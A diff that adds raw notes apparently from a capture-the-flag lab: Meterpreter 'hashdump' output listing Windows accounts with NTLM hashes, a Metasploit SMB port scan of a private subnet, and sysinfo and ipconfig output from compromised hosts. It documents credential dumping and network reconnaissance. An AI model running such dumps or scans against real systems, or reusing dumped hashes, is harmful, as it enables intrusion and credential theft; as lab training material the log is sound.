@@ -1,0 +1,113 @@
+User Hashes
+
+192.168.91.201-203
+meterpreter > hashdump
+Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:b49b7750e2f7f2bdd3da9522f2b4feb4:::
+
+192.168.92.204
+meterpreter > hashdump
+Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
+Fangfei:1003:9c925d60e0c3fe378347bb1e72cc9f76:c5910d8ecc4b25e9549b3feafcadb683:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:b49b7750e2f7f2bdd3da9522f2b4feb4:::
+
+System Info
+
+Computer        : CTF02-2K3-T01
+OS              : Windows .NET Server (Build 3790, Service Pack 1).
+Architecture    : x86
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
+
+
+portscan for 192.168.92.0/24
+msf auxiliary(tcp) > run
+
+[+] 192.168.92.1:         - 192.168.92.1:139 - TCP OPEN
+[+] 192.168.92.1:         - 192.168.92.1:445 - TCP OPEN
+[+] 192.168.92.22:        - 192.168.92.22:445 - TCP OPEN
+[+] 192.168.92.21:        - 192.168.92.21:139 - TCP OPEN
+[+] 192.168.92.21:        - 192.168.92.21:445 - TCP OPEN
+[+] 192.168.92.22:        - 192.168.92.22:139 - TCP OPEN
+[+] 192.168.92.31:        - 192.168.92.31:445 - TCP OPEN
+[+] 192.168.92.31:        - 192.168.92.31:139 - TCP OPEN
+[+] 192.168.92.32:        - 192.168.92.32:445 - TCP OPEN
+[+] 192.168.92.32:        - 192.168.92.32:139 - TCP OPEN
+[*] Scanned  29 of 256 hosts (11% complete)
+[*] Scanned  52 of 256 hosts (20% complete)
+[*] Scanned  77 of 256 hosts (30% complete)
+[*] Scanned 105 of 256 hosts (41% complete)
+[*] Scanned 129 of 256 hosts (50% complete)
+[*] Scanned 155 of 256 hosts (60% complete)
+[*] Scanned 180 of 256 hosts (70% complete)
+[+] 192.168.92.203:       - 192.168.92.203:139 - TCP OPEN
+[+] 192.168.92.203:       - 192.168.92.203:445 - TCP OPEN
+[+] 192.168.92.201:       - 192.168.92.201:139 - TCP OPEN
+[+] 192.168.92.202:       - 192.168.92.202:445 - TCP OPEN
+[+] 192.168.92.202:       - 192.168.92.202:139 - TCP OPEN
+[+] 192.168.92.201:       - 192.168.92.201:445 - TCP OPEN
+[+] 192.168.92.204:       - 192.168.92.204:139 - TCP OPEN
+[+] 192.168.92.204:       - 192.168.92.204:445 - TCP OPEN
+[*] Scanned 205 of 256 hosts (80% complete)
+[*] Scanned 231 of 256 hosts (90% complete)
+[*] Scanned 256 of 256 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+
+-----------------------------------------------------------------------------------
+
+meterpreter > ipconfig
+
+Interface  1
+============
+Name         : MS TCP Loopback interface
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 1520
+IPv4 Address : 127.0.0.1
+
+
+Interface 65539
+============
+Name         : Intel(R) PRO/1000 MT Network Connection #2
+Hardware MAC : 00:50:56:80:09:74
+MTU          : 1500
+IPv4 Address : 192.168.92.21
+IPv4 Netmask : 255.255.255.0
+
+meterpreter > sysinfo
+Computer        : CTF02-2K3-INT01
+OS              : Windows .NET Server (Build 3790, Service Pack 1).
+Architecture    : x86
+System Language : en_US
+Domain          : MEDINASOD
+Logged On Users : 2
+Meterpreter     : x86/windows
+
+
+meterpreter > hashdump
+Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+hackertan:1007:aad3b435b51404eeaad3b435b51404ee:2c17cab862ced43415792037390dc676:::
+hackervictor:1005:aad3b435b51404eeaad3b435b51404ee:2c17cab862ced43415792037390dc676:::
+localadmin:1003:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::
+SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:b49b7750e2f7f2bdd3da9522f2b4feb4:::
+
+
+
+
+192.168.92.22
+meterpreter > hashdump
+Admin:1003:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::
+Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+hackerShattuck:1007:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
+hackervictor:1005:aad3b435b51404eeaad3b435b51404ee:2c17cab862ced43415792037390dc676:::
+hackerWill:1006:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::
+localadmin:1004:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::
+SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:b49b7750e2f7f2bdd3da9522f2b4feb4:::
+testing:1008:aad3b435b51404eeaad3b435b51404ee:ed2ae0d1f7e22ca3187d8e8d91d968c7:::
